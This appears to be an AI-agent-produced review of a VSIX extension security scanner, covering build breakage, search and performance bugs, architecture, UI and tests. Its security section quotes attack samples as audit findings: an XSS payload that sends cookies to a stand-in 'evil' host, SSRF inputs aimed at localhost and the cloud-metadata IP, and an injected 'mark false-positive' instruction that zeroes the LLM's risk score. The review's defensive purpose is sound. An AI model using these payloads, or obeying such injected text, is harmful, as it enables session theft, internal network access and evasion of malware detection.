# Full Application Review — Architecture · UI · Security · Performance · Tests

**Date:** 2026-07-09  ·  **Branch:** `alpha/app-review-architecture-ui-security-1a83c3`  ·  **HEAD:** `5c08e0c`

**Method:** Multi-agent review across six domains. Every CRITICAL/HIGH finding was put through an independent adversarial verification pass (a second agent tried to *refute* it, often with a throwaway `fastify.inject` / `tsx` proof under `.temp-test/`, deleted afterward). No server was started; port 8001 was never touched; no repo file was modified. Findings below are marked **✓ verified** where that pass confirmed them.

---

## Executive summary

The app works in the happy path but has three issues that make it unusable in practice, and a broken build underneath all of it:

| # | Blocker | Root cause | Fix size |
|---|---------|-----------|----------|
| 0 | **Build is red on HEAD** | `readdirSync`/`statSync` used but not imported after 3 colliding "optimize" PRs; `GET /api/reports` 500s, `tsc` fails with 9 errors, 1 test fails | 1 line |
| 1 | **Batch search returns nothing** | Client-side filter trap in `batch.html` — a sticky `localStorage` filter intersects to 0 rows on every search, silently | Small |
| 2 | **Scans take hours-to-days** | LLM triage runs *sequentially* (one call in flight); tiny fixed batch sizes (5/20 findings) waste the operator's 500k-context window; cost is linear in findings with 3× voting + full-set judges + no dedupe | Medium |
| 3 | **Security exposure** | 1 CRITICAL (stored XSS from a malicious VSIX) + several HIGH (SSRF to cloud-metadata IP, zip-bomb DoS, ReDoS, prompt-injection score-zeroing) | Mixed |

Architecture and UI are "mildly fragmented" in a specific, fixable way: **the same logic is re-implemented in divergent copies that now disagree with each other** (risk thresholds, color maps, body parsing, batch runners). That divergence is what produces the silent bugs.

**Severity totals (all dimensions):** 5 CRITICAL · 27 HIGH · 26 MEDIUM · 9 LOW.

---

## 0. BLOCKER — the build is broken right now ✓

**`GET /api/reports` throws at runtime and the project does not typecheck.**

- [src/index.ts:435](src/index.ts:435) calls `readdirSync(reportsDir)` and `:438` calls `statSync(...)`, but the `fs` import at [src/index.ts:15](src/index.ts:15) doesn't include them (only `fs/promises` `readdir`/`stat` are around, unused).
- `npm run typecheck` → **9 errors** (2× `TS2304 Cannot find name`, 6× unused-import `TS6133`). `npm test` → **1 failed / 226 passed** (`tests/api.test.ts:64` gets 500 instead of 200). Vitest transpiles *without* typechecking, which is exactly why this shipped.

**Why it happened (verified git archaeology):** PR #24 added streaming upload; PR #26 made `/api/reports` async; **PR #28 (`fe5c69d`) was cut from a stale base and silently reverted both** — its diff shows `-await pipeline(...) +writeFileSync(Buffer.concat(chunks))` and `-await readdir +readdirSync`; PR #33 (`49e0459`) then "restored missing imports" for streaming code #28 had already removed. Three PRs all editing the same 1,639-line file's single import block.

**Fix:** re-apply the async `/api/reports` body (`readdir`/`stat` from `fs/promises` + `Promise.allSettled`) and the streaming upload so imports match usage, **then gate merges on `tsc --noEmit` + `vitest run`.** Tests alone cannot catch import breakage here.

> `★ Insight ─────────────────────────────────────`
> This is the clearest evidence for the architecture recommendation below: the monolith isn't a *style* problem, it's a *merge-collision* problem. Every optimization PR is forced to edit the same import block and handler bodies, so concurrent work silently clobbers itself. Splitting the file is regression **mitigation**, not cleanup.
> `─────────────────────────────────────────────────`

---

## 1. BLOCKER — batch search returns no results ✓ (reproduced on real data)

**It is not the marketplace API.** The exact request the server builds was replayed with `curl`: HTTP 200, 50 results every time — including with the string-typed `pageNumber`/`pageSize` that multipart produces, and with `sortBy` 10 vs 4. `POST /api/search` via `fastify.inject` also returns 200 with 50 results for the page's default auto-search.

**Root cause — a client-side filter trap** in [assets/templates/batch.html](assets/templates/batch.html:624):

1. `loadFilterSettings()` forces the sort to **"Published Date"** ([batch.html:170](assets/templates/batch.html:170)), so every default search returns brand-new extensions that have **never been scanned** — `ext.scan` is absent.
2. `applyResultFilters()` makes **every** filter option except "unscanned" require `r.scan` to exist — including the counter­intuitive "Without LLM" and "No Verdict" ([batch.html:637-642](assets/templates/batch.html:637)).
3. Filter selections persist to `localStorage`, and `applyResultFilters()` re-saves them on **every render** ([batch.html:625](assets/templates/batch.html:625)) — so **one past click on any filter dropdown arms the trap permanently**, with no error and no indication filtering is active.

Simulated over the real 50-extension response: no filters → 50 shown; any single saved filter (`scanned`, `CLEAN`, `no-llm`, `Low Risk`) → **0 shown, forever.**

**Immediate unblock:** on `/batch`, set all four *Filters* dropdowns back to "All …" (or run `localStorage.removeItem('batchFilters')` in DevTools).

**Code fix (all in `batch.html` unless noted):**
- `executeSearch` ([batch.html:271](assets/templates/batch.html:271)) never checks `resp.ok`; on a 500 it assigns `undefined` to `searchResults`, then `.filter` throws → misleading toast. Add `if (!resp.ok) throw…` and `searchResults = data.results || []`.
- When `filtered.length < searchResults.length`, show it: results-title suffix `(N hidden by filters)` + a one-click **Clear filters**. This makes the trap self-diagnosing.
- Relabel/repair `no-llm` and `NO_VERDICT` so they don't silently require a scan; stop persisting result filters across sessions.
- **Latent server landmine:** since `fe5c69d`, [src/history.ts:27](src/history.ts:27) makes `loadHistory` **throw** on a corrupt `scan_history.json`; `/api/search` swallows that into a generic 500 ([index.ts:721](src/index.ts:721)). One bad write turns the whole batch page into silent 500s. Wrap the history-augmentation block in its own try, and log + surface the real error instead of swallowing it.

---

## 2. BLOCKER — scans take hours-to-days ✓

> **Operator backend (confirmed 2026-07-09):** hosted OpenAI-compatible endpoint, models with **~500k-token context windows**. *Not* the code's default (`llama3.2` via Ollama). This re-scopes the analysis below.

**LLM request cost is linear in findings F, and the calls are serialized.** For this operator's backend the drivers, in impact order:

- **Triage batches run strictly sequentially** — [src/analyzer/llm.ts:910](src/analyzer/llm.ts:910) `for (const batch of batches)` with the `generate()` `await`ed inside ([:940](src/analyzer/llm.ts:940)); `pLimit(concurrency)` exists (default 10) and is used elsewhere but **not here**. One LLM call is ever in flight — on a hosted API that is pure wasted wall-clock, since concurrent requests aren't GPU-bound.
- **Fixed tiny batch sizes waste the 500k window** — `TIER_A_MAX = 5`, `TIER_B_MAX = 20` findings per request ([src/analyzer/llm.ts:882-883](src/analyzer/llm.ts:882)); evidence sliced to 1500 chars ([:924](src/analyzer/llm.ts:924)). A 500k-token context could hold **hundreds to low-thousands** of findings per call. This is the single biggest lever and it's a constant/token-budget change, not a rearchitecture.
- **Same-model 3× voting** on every high/critical finding ([:1101-1141](src/analyzer/llm.ts:1101)).
- **Every judge re-assesses the full finding set** — `main + each judge` over all findings ([:1678-1699](src/analyzer/llm.ts:1678)); `judgesValidateAllFindings` only gates a *CPU merge*, not the LLM work.
- **Sampling deliberately disabled, no dedupe cache** — `calculateSecuritySampleSize` returns `fileGroup.findings.length` with the comment *"Every finding must be individually assessed"* ([src/analyzer/llm-batch.ts:136](src/analyzer/llm-batch.ts:136)). Identical `(pattern, evidence)` matches across a minified bundle each get their own slot.

**Worked example (F=5000, J=2 judges, 20% cleared by fast heuristic):** current code issues ~(1+J)·(⌈A/5⌉+⌈B/20⌉) ≈ 3·275 ≈ **825 sequential batch calls** + 3× voting on high/criticals + summary calls, all one-at-a-time → hours-to-days of wall clock even though each hosted call returns in seconds. With batches sized to the 500k window (~500-1000 findings/call) **and** `pLimit(10)` parallelism, the same 5000 findings become **~10-40 requests, ~10 in flight** → minutes.

> **NOTE — operator backend is Ollama *cloud* (confirmed 2026-07-09): 756B-class frontier models, context set to 256K server-side via the Ollama GUI.** Not local (`ollama ps` shows nothing — inference is remote). This resolves the truncation concern for the operator: effective context is a genuine 256K managed server-side, not a 4K Modelfile default. Two things still matter: **(1)** confirm the app's *programmatic* `/v1` calls inherit the GUI's 256K (a GUI/session override may not apply to API requests; if not, they'd silently run at the model's default). **(2)** The default *local* config (`llama3.2` + Ollama, [config.ts:77-79](src/config.ts:77)) remains broken for other users because `/v1` can't carry `num_ctx` — worth fixing (native `/api/chat`, or document `OLLAMA_CONTEXT_LENGTH`) but not on the operator's path. Regime implications: cloud inference is **not** GPU-bound, so `pLimit` parallelism pays like a hosted API (mind cloud rate-limits/cost); 256K comfortably fits whole source files (~1MB of code) but not multi-MB minified bundles; and a 756B frontier model is capable enough that **information starvation — not reasoning — is the accuracy bottleneck (§2a)**.

---

## 2a. ACCURACY — findings are assessed with too little context → false positives ✓ (operator-reported)

**The model (and every judge) sees ~±2 lines around a regex hit and is primed by the scary pattern name, so it confirms benign code as critical.** [extractEvidence](src/analyzer/static.ts:952) returns `lines.slice(lineNum-2, lineNum+3)` capped at 500 chars ([static.ts:978](src/analyzer/static.ts:978)); the `context` field is ≤200 chars ([static.ts:250-256](src/analyzer/static.ts:250)). With ±2 lines the model cannot see whether the dangerous value is a hardcoded literal or user input, whether a guard precedes it, or whether it's a test/mock file — the information that separates a real vuln from a benign match. This is a precision failure, and for a security scanner false positives are as damaging as misses: they train the analyst to ignore the tool.

**Fix — scale the *unit of context* to the finding (the "full context without full context" resolution):**
- **Level 0 (cheap, biggest win):** expand evidence from ±2 lines to the **enclosing function/block + the file's import header** (walk to balanced braces / nearest preceding `function`/`=>`/`class`; no parser needed). Lets the model see provenance and guards.
- **Level 1 (uses the 256K window):** send the **whole file once, findings annotated inline**, and assess all of that file's findings together with the full file visible — one call per file, full context per finding, no per-finding file resend. At 256K, whole source files fit with room to spare (budget ≈ 230K input ≈ ~900KB code). Minified single-line bundles exceed that and fall back to Level 0 + the `isMinified`/`probableOrigin` signals already on `Finding` ([types/index.ts:22-23](src/types/index.ts:22)) but currently buried in the prompt.
- **Level 2 (ambiguous + high-risk minority only):** a second pass with a **backward data-flow slice** (assignments to the tainted identifier traced toward source: param → caller → user input/network). Only the small unresolved-and-scary subset pays for this.
- **Cross-cutting:** stop handing the model the pattern title + base risk as the framing (it biases toward confirmation); surface the `fileType`/`isMinified`/`probableOrigin` signals prominently; ensure the enriched context lands in `Finding.evidence` so judges inherit it automatically.

**Interaction with §2 (performance):** Level 1 *reduces* call count (one per file, not one per finding) while enlarging each prompt — accuracy and speed push the same way. It preserves 100% per-finding coverage. The keystone is a genuinely large effective `num_ctx`.

### Design decision (2026-07-09): no shortcuts — full coverage of bundled deps + real cross-file reachability

Operator ruled out any coverage-reducing tier (no hash-skipping known-good libraries, no light-touch pass on bundled/minified dependencies). Everything is fully analyzed. That forces **cross-file reachability** (within-file-only would leave "reachable *if* caller passes tainted input" cop-out verdicts, itself unacceptable). Target design — a **two-track context assembler**, both tracks reaching 100% coverage:

- **Track A — readable source (first-party + unminified):** whole-file context + a lightweight symbol/call index (`es-module-lexer`/`acorn`, *not* the current regex at [static.ts:1006](src/analyzer/static.ts:1006)) that pulls caller sites and imported-symbol definitions from other files into the prompt when a finding's taint traces to a parameter. Reuses `readFindingSourceFiles`/`chunkSourceFiles` ([llm.ts:257](src/analyzer/llm.ts:257)) — currently wired only to the executive summary, not assessment.
- **Track B — minified/generated bundles:** **de-minify first** (the code does *none* today). (1) Reconstruct modules from shipped source maps (`.js.map`/`sourceMappingURL`) → bundle becomes Track A, un-mangled; (2) no map → beautify to restore line structure; (3) still oversized → overlapping large chunks (~200K-token windows, generous overlap, finding-anchored). De-minification also fixes the §3 ReDoS exposure (no more 224 regexes per-line over megabyte minified lines) and the token-cost blowup — highest-leverage single addition, and it exists *because* bundles can't be skipped.

**Honest limit (decided 2026-07-09):** precise cross-scope taint through a *mangled webpack runtime with no source map* cannot be statically traced. Chosen handling — **max context + a reduced-certainty flag**: give the model the largest coherent chunk that fits and mark verdicts on map-less minified code as reduced-certainty in the report, rather than investing in heavy deobfuscation/scope-recovery. Completeness stays honest about its own bound.

**Coverage ledger:** ID-keyed finding manifest; missing IDs retried never padded (also fixes the §3 index-misbinding HIGH); oversized inputs chunked-with-overlap and logged; per-scan assertion `assessed == total`. Speed from cloud parallelism (`pLimit`, not GPU-bound — mind rate limits) + no re-sent context, never from skipping.

**Build order:** (i) whole-file + ID-keyed manifest into the assessment path (accuracy + misbinding) → (ii) de-minification (source maps, else beautify) → (iii) symbol/caller index for cross-file reachability → (iv) overlapping-chunk coverage + ledger for map-less bundles.

**Ranked fixes for the 500k-context / hosted backend** (all preserve 100% per-finding coverage except where noted):

| Fix | Impact for this backend |
|-----|--------------------------|
| Run triage batches through `pLimit(concurrency)` | **10-20× (hours → minutes)** — concurrency isn't GPU-bound on hosted |
| Size batches to the context window (raise `TIER_B_MAX` / token-budget the packing) | **~10-50× fewer requests** — collapses the linear-in-F term |
| Gate judges/consensus to *escalated* findings only | Removes the ×(1+J) and ×3 multipliers (trades consensus breadth, not coverage) |
| Dedupe identical `(pattern, evidence)` findings via an LLM-result cache | Large on repetitive minified bundles (near-lossless) |
| Pipeline the batch runner across extensions ([index.ts:1432](src/index.ts:1432)) + cap executive-summary source volume | Removes the remaining sequential stalls |

Static analysis is a *secondary* cost (minutes of blocked event loop on large extensions), not the hours-to-days term — but see the ReDoS and per-line findings in §3/§5.

---

## 3. Security

> Default posture is loopback (`HOST` defaults to `127.0.0.1`, [src/config.ts:91](src/config.ts:91)) with **no auth on any route**. Findings marked *posture-dependent* escalate sharply if `HOST=0.0.0.0`, because the CORS allowlist constrains browsers, not direct HTTP clients.

### CRITICAL — Stored XSS from a malicious VSIX ✓
[src/index.ts:469](src/index.ts:469) / [:1381](src/index.ts:1381) — `marked()` output is injected via `innerHTML` ([index.html:228](assets/templates/index.html:228)) with **no DOMPurify, no sanitizer, no CSP** (marked v17 passes raw HTML through). Attacker-controlled `package.json` `description`/`repository` land *outside* code fences in the report table ([report.ts:183-184](src/analyzer/report.ts:183)), as does raw LLM prose ([report.ts:163](src/analyzer/report.ts:163)). A crafted extension runs JS on the analyzer origin — which also serves the `prompts.yaml`-writing endpoint. **Verifier correction:** the example payload must *quote* the attribute (`<img src=x onerror="fetch('//evil/'+document.cookie)">` or `<svg onload=alert(1)>`); marked escapes unquoted-single-quote values. Mechanism proven end-to-end; severity stands. **Fix:** DOMPurify on `marked()` output (or disable HTML in marked + HTML-escape every interpolation in `report.ts`) **and** add a strict CSP via a Fastify hook.

### HIGH — SSRF to internal hosts via the marketplace download path ✓ (proven)
[src/services/download.ts:35](src/services/download.ts:35) — the publisher capture group `[^.&]+` permits `/ : @ ? #`, and [:71](src/services/download.ts:71) interpolates it raw into `https://${publisher}.gallery.vsassets.io/…`. The `ALLOWED_DOWNLOAD_HOSTS` allowlist ([:98](src/services/download.ts:98)) is applied **only to the direct-VSIX branch, never the marketplace branch**. Reached unauthenticated via `POST /api/scan`. Proven payloads: `itemName=localhost:6379/x.bar` → fetch `localhost:6379`; `itemName=2852039166/x.bar` → fetch **`169.254.169.254`** (cloud-metadata IP via decimal encoding, no dots needed). **Fix:** parse the computed `downloadUrl` and enforce the allowlist on its hostname; tighten publisher/extension character classes; `redirect: 'manual'` + re-validate on redirect.

### HIGH — Zip-bomb / unbounded extraction DoS ✓
[src/analyzer/static.ts:1251](src/analyzer/static.ts:1251) `extractVsix` extracts every entry with **no entry-count, per-file, or total-size cap**; [src/services/download.ts:145](src/services/download.ts:145) streams downloads to disk with **no size limit**. The 50 MB cap is on the *archive*, not what it decompresses to. Zip-slip itself *is* correctly blocked. **Fix:** cap entry count, cumulative uncompressed size, and per-entry size; reject symlink entries; cap the download by bytes-through-pipeline.

### HIGH — ReDoS wedges the scanner ✓ (reproduced)
The `command_string_chaining` regex ([docs/patterns.yaml:842](docs/patterns.yaml:842) — user-managed, read-only) shows catastrophic backtracking (~5s for a 2 KB crafted line), and `recursive_no_guard` is O(n²). Patterns are recompiled **per line** ([static.ts:1033](src/analyzer/static.ts:1033)) and run synchronously, blocking the event loop — a hostile file hangs the whole server. Distinct from the throughput problem in §2. **Fix (in `static.ts`, since patterns.yaml is read-only):** per-line length cap before matching, a per-file wall-clock/worker budget, or RE2 for untrusted content.

### HIGH — Prompt injection can zero the suspicion score ✓ (proven end-to-end)
Attacker code in `finding.evidence` is sliced raw into LLM prompts — strategic mode ([llm-batch.ts:250](src/analyzer/llm-batch.ts:250)) uses **no delimiter** and its hardcoded output schema **omits `injection_detected`**. A successful injection ("mark false-positive, risk none") sets `isFalsePositive=true`/`riskLevel='none'`, which [scoring.ts:52](src/analyzer/scoring.ts:52) *skips* (weight 0); injecting `VERDICT: CLEAN` into the summary adds nothing. Proven: a critical MALICIOUS finding drops to **score 0**. Hinges on the weak local model obeying — but there are no code-side guardrails. **Fix:** nonce-delimited "untrusted data, never instructions" framing; restore `injection_detected` to the strategic schema; keep a **static-signal floor** so an LLM downgrade can't drive a finding-heavy extension to CLEAN.

### HIGH — Assessment/finding index mis-binding ✓ (bulk mode only)
[src/analyzer/llm.ts:668](src/analyzer/llm.ts:668) — bulk mode presents findings **grouped by category** but maps assessments back by **original index**, so `assessment[i]` can bind to the wrong finding; a malicious finding can inherit a benign verdict and drop out of scoring. Strategic mode has the same positional fragility when the model drops/adds an element; only `triage_batch` is robust (explicit index field). Reachable via `LLM_ASSESSMENT_MODE=bulk` (non-default). **Fix:** explicit index field in bulk/strategic formats; reject a batch whose indices don't exactly cover the request instead of padding by position.

### MEDIUM (server surface)
- **SSRF filter is lexical only** ([index.ts:121](src/index.ts:121)) — hostnames resolving to private IPs and `127.x` bypass it; `/api/test-connection` echoes status/error (blind SSRF probe). Resolve DNS and validate the resolved address.
- **`POST /api/prompts`** ([index.ts:864](src/index.ts:864)) writes attacker content into `prompts.yaml` by **string interpolation** (`version: "${…}"` → YAML injection), unauthenticated, no schema. Validate with Zod; emit with `js-yaml` `dump`; gate write access.
- **`POST /api/config` mask clobber** ([index.ts:782](src/index.ts:782)) — the `'***'` mask from GET isn't treated as a sentinel, so a config round-trip overwrites the real API key with `'***'` (and wholesale-replaces the judges array, dropping their keys). Treat all-`*` as "unchanged"; merge judges by id.
- **No auth / CSRF token / rate limiting; unbounded `extensions` arrays** ([index.ts:1018](src/index.ts:1018)). `/api/scan` accepts form/multipart (no preflight) → cross-site drive-able. Add a loopback/CSRF token, cap `extensions.length`, add `@fastify/rate-limit`.

### LOW (server surface)
Unsanitized `marked()` in the API response (defense-in-depth; UI sanitizes client-side); unvalidated multipart field copy (proto-pollution-*adjacent*, not exploitable — strings ignore the `__proto__` setter); download redirect allowlist not re-checked + client gallery URL built without `encodeURIComponent`; `/api/reports` path check omits `\` (Windows-only).

> `★ Insight ─────────────────────────────────────`
> The pipeline security findings share one theme: **the analyzer trusts its own inputs.** A VSIX is adversarial by definition here — it's the thing being investigated — yet its `package.json`, its file sizes, its code bytes (as regex input and as LLM-prompt content) all flow through without treating the extension as hostile. The static-signal floor (§3 prompt-injection fix) is the single highest-leverage guardrail: it caps how far *any* LLM-side manipulation can move the verdict.
> `─────────────────────────────────────────────────`

---

## 4. Architecture

**Verdict:** three files past the project's own 800-line max — [index.ts](src/index.ts) (1639), [llm.ts](src/analyzer/llm.ts) (1810), [static.ts](src/analyzer/static.ts) (1279) — are actively producing regressions (see §0). Fragmentation here = duplication that has drifted.

**Verified HIGH:**
- `/api/history` filters **don't compose** ([index.ts:532](src/index.ts:532)) — `entries` is snapshotted once; the risk and LLM filters each re-filter the *original* array and overwrite the search result. `?search=foo&risk=High` ignores `foo`. ✓
- `runBatchScan` is a **floating promise with no `.catch`** ([index.ts:1037](src/index.ts:1037)) while its two siblings have one — any rejection becomes an `unhandledRejection` that **kills the live process** and every in-flight scan. ✓
- **Scan cancellation is cosmetic** once LLM work starts ([index.ts:1191/1203](src/index.ts:1191) check `isCancelled()` only *before* the LLM block), and cancelled tasks **leak in the registry forever** (no `cancelled` state in the eviction policy). ✓

**MEDIUM (duplication / layering):** all scan state is process-memory only (restart mid-batch orphans temp dirs); `Ollama`/`OpenAI` providers ~90% copy-paste and drifting; `searchExtensions`/`getExtensionDetails` duplicate ~80 lines of mapping; multipart-vs-JSON body parsing hand-rolled in 3 routes; two batch runners duplicate a 33-line placeholder literal; `StaticAnalyzer` does outbound network I/O; `POST /api/prompts` hand-rolls YAML; history JSON used as a DB with O(N) scans per lookup.

**Proposed target layout** (behavior-preserving moves, public entrypoints stay importable):
```
src/server/    app.ts (registration only) · routes/{pages,scan,batch,reports,history,search,config,prompts}.ts
               sse.ts · request-params.ts (shared body extraction)
src/scan/      task-registry.ts (+ 'cancelled' state) · scan-service.ts · batch-runner.ts (one generic loop)
               llm-endpoint-probe.ts (shared /api/tags vs /v1/models)
src/analyzer/static/  analyzer.ts · file-type.ts · endpoints.ts · bundled-deps.ts · evidence.ts · repo-check.ts · vsix.ts
src/analyzer/llm/     client.ts · strategies/{bulk,triage,strategic}.ts · exec-summary.ts · consensus.ts
                      fast-assessor.ts · source-context.ts · parse.ts
src/providers/ openai-compat-base.ts (shared; only isAvailable overridden)
src/prompts-io.ts (js-yaml serializer) · services/marketplace.ts (shared mapGalleryExtension())
```
**Migration order (leaf-first, each step validated by the existing 227-test suite):** (0) **fix the build + add `tsc`/`vitest` merge gates** → (1) extract pure leaf helpers (request-params, sse, mapper, provider base) → (2) move task registry + `runExtensionScan` behind re-exports → (3) collapse the two batch runners + add the missing `.catch` → (4) split routes into Fastify plugins one file per commit → (5) split `llm.ts` along its existing test seams → (6) split `static.ts` → (7) replace hand-rolled YAML with `js-yaml` behind a round-trip test.

---

## 5. User Interface

**Verdict:** five Nunjucks pages carry **~2,100 lines of inline per-page JS** against a 270-line shared `app.js`. The fragmentation now produces real bugs, not just duplication.

**Verified HIGH:**
- **Cancel button is a silent no-op on History and Report pages** ([history.html:463](assets/templates/history.html:463)) — a global-name collision with deferred `app.js` (`cancelCurrentScan` overwrites the page's `cancelScan`). ✓
- `executeSearch` doesn't check `resp.ok` → the batch-search break in §1. ✓
- **History "Rescan All" / "LLM Scan All" scrape extension IDs out of rendered `<td>` cells** ([history.html:366](assets/templates/history.html:366)) and concatenate the ISO date into the ID, corrupting it. ✓
- `llmAnalyzeAllHistory` reads LLM status from the **wrong column** ([history.html:500](assets/templates/history.html:500)) — already-analyzed scans are never skipped. ✓
- **History risk filter "Low" never matches** server label "Low Risk" ([history.html:23](assets/templates/history.html:23)) — always empty. ✓
- `/api/history` filters don't compose (server side of §4). ✓
- **Client risk thresholds (70/40/20, Critical/High/Medium/Low) contradict server scoring (50/30/15, Very Suspicious/…)** ([history.html:121](assets/templates/history.html:121)) — badges lie. ✓
- **SSE error path is swallowed** ([app.js:140](assets/static/app.js:140)) — on a connection error the progress card **freezes forever** ("Analyzing…"), Cancel still visible, no toast, no recovery. ✓

**MEDIUM/LOW:** dead pagination + hard 1000-row cap + full re-render per keystroke (history); up to 500 rows rebuilt on every filter change + a live marketplace re-search after every scan (batch); report-page sanitizer walks every node one-by-one (main-thread freeze on large reports); `waitForAppJs` 50ms polling hack; a **`deleteScan` landmine** that targets `DELETE /api/history` which wipes *all* history ([history.html:296](assets/templates/history.html:296)); undefined CSS vars `--safe`/`--caution`; four divergent color maps; a11y gaps (keyboard-inaccessible sort headers, modal without focus management, duplicate toast-container IDs, unlabeled progress bars); muted text fails WCAG AA (~3.8:1).

**Recommended consolidation (sized for a single maintainer):** keep server-rendered Nunjucks (no SPA rewrite — it would discard working templates), skip a bundler (nothing needs transpiling). Convert to **native ES modules**: `app.js` → `/static/lib/*.js` exporting `fetchJson` (ok-check + error normalization), `ScanTracker` (with a default `onError`), toasts, formatters; each page's inline block → `/static/pages/<page>.js` via `<script type=module>` (modules defer by default → deletes `waitForAppJs` and every global collision). One `startTrackedJob(...)` replaces the 10 copied boilerplate blocks. **Kill every client-side risk/verdict threshold and color literal** by rendering the server's `risk_label`/`risk_color` through `style.css` classes. Keep fetched entries as the data model (fixes the DOM-scraping bugs). ≈ one day of mechanical extraction; the four HIGH correctness fixes are small and can land first, independently.

---

## 6. Tests

**Current state:** 18 test files, **227 tests, 1 failing** (the §0 `/api/reports` import bug) — pure functions, static analysis, pattern/scoring, URL parsing, and history concurrency are genuinely well covered. **The gaps cluster exactly on the untested attack surface.**

**Top missing tests (priority order):**
1. `extractVsix` zip-slip **and** zip-bomb guard — the existing test is a no-op `expect(true).toBe(true)` ([tests/analyzer.test.ts:495](tests/analyzer.test.ts:495)). ✓
2. `downloadExtension` SSRF allowlist + the marketplace-branch bypass. ✓
3. `GET`/`DELETE /api/reports/:name` path-traversal guards. ✓
4. Consensus merge semantics (majority vote, tie-breaks, judge escalation) — orchestrator tests currently assert almost nothing. ✓
5. Batch runners + `/api/batch-scan` + `/api/batch-llm-analyze` — **zero tests**. ✓
6. `/api/search` + marketplace client (currently only live-network tests, flaky offline) + history augmentation.
7. `POST /api/prompts` YAML round-trip (needs a path seam first).
8. SSE progress + result clearing.
9. Multipart VSIX upload sanitization.
10. `OpenAIProvider` (zero tests while `OllamaProvider` is fully covered).

**Also:** audit for other no-op assertions like #1 — a green suite with a fake assertion is worse than a missing test.

---

## Recommended sequencing

1. **Unblock (hours):** fix §0 build + `tsc`/`vitest` merge gates → fix §1 batch search (`resp.ok`, default `[]`, clear-filters affordance, un-swallow the history error) → add the missing `.catch` on `runBatchScan` (§4).
2. **Make scans finish (days):** `pLimit` on triage batches + set `num_ctx` + gate judges/consensus to escalated findings (§2). Biggest wins are backend-dependent — see the table.
3. **Close the sharp security edges (days):** static-signal floor + evidence delimiters (§3 prompt-injection) → DOMPurify + CSP (§3 XSS) → SSRF allowlist on the marketplace branch → extraction caps + per-line/ReDoS guard.
4. **De-fragment (≈1 week, incremental):** UI ES-module extraction + kill duplicated thresholds/colors (§5); then the leaf-first `index.ts`/`llm.ts`/`static.ts` split (§4), each commit test-gated.
5. **Backfill tests (ongoing):** the 10 above, security surface first.

## Fixes that share code — do them together to avoid double work

Several findings touch the same functions; batching them means editing a hot path once rather than twice:

- **Prompt-construction hot path** (`llm-batch.ts` / `llm.ts` triage): the §2 batch-sizing change, the §3 prompt-injection delimiters + restored `injection_detected`, and the §3 index-binding fix all edit the same prompt builders and response parsers. One pass.
- **Scoring integrity** (`scoring.ts`): the §3 static-signal floor and the injection/verdict-zeroing fix are the same edit — a floor that caps how far any LLM downgrade can move the verdict.
- **VSIX intake** (`static.ts` extract + `download.ts`): the §3 zip-bomb caps, the §3 `detectFileType` partial-read, and the §5 ReDoS per-line guard are all "treat the VSIX as hostile" and belong in one hardening pass.
- **Monolith split** (§4) should be sequenced *around* the above: fix the build first, land the small hot-path fixes, *then* split — so the split moves already-correct code and the fixes don't get re-litigated mid-move.

## Open decisions for you

Backend is now known (hosted, 500k context) so §2 is settled. Remaining:
- **(a)** Confirm 100% per-finding LLM coverage is a hard requirement (your no-sampling emphasis implies yes) — this rules the "gate judges to escalated findings" fix in but "restore sampling" out.
- **(b)** Target posture — always loopback, or must it survive `HOST=0.0.0.0`? Several MEDIUM security findings jump to HIGH/CRITICAL if exposed.
